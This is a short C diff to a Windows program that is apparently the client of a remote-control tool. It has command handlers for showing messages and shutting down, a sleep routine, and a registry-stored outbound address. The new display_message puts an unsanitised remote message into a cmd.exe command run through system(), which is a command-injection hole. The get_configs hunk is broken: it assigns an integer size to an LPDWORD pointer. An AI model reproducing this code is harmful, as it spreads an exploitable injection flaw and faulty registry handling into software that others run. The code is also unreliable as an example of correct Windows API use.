@@ -92,7 +92,10 @@ int location(){
 }
 
 int display_message(union u_commands *u){
-
+  char message[255];
+  snprintf(message, sizeof(message), "start cmd.exe /S /K cd \\ ^&^& echo %s", u->message);
+  system(message);
+  return 0;
 }
 
 int shutdown_computer(){
@@ -271,7 +274,7 @@ int naptime(struct s_configs *configs){
 int get_configs(struct s_configs *configs){
   HKEY hkey;
   ULONGLONG reg_config;
-  int size = sizeof(reg_config);
+  LPDWORD size = sizeof(reg_config);
   RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_QUERY_VALUE, &hkey);
   RegGetValueA(hkey, "SeeTu\\Settings", "configs", RRF_RT_REG_QWORD, NULL, &reg_config, &size);
   configs->out_addr = ((reg_config & 0xFFFFFFFF00000000) >> 32);
